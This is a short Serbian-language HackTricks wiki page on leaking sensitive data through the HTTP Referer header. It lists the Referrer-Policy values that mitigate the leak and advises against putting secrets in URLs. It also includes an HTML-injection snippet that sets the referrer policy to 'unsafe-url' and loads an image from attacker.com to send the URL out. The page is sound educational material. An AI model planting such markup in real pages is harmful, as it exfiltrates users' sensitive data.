# Zanimljiv HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer zaglavlja i politika

Referrer je zaglavlje koje browseri koriste da naznače koja je stranica prethodno posećena.

### Leak osetljivih informacija

Ako se u nekom trenutku unutar web stranice bilo koja osetljiva informacija nalazi u parametrima GET zahteva, ako stranica sadrži linkove ka eksternim izvorima ili napadač može da navede/predloži (socijalnim inženjeringom) korisniku da poseti URL pod kontrolom napadača, mogao bi da eksfiltruje osetljive informacije iz poslednjeg GET zahteva.

### Mitigacija

Možete naterati browser da prati **Referrer-policy**, čime se može **sprečiti** slanje osetljivih informacija drugim web aplikacijama:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Protivmere

Ovo pravilo možete zaobići pomoću HTML meta taga (napadač mora da iskoristi HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Odbrana

Nikada ne stavljajte osetljive podatke u GET parametre ili putanje u URL-u.

{{#include ../banners/hacktricks-training.md}}
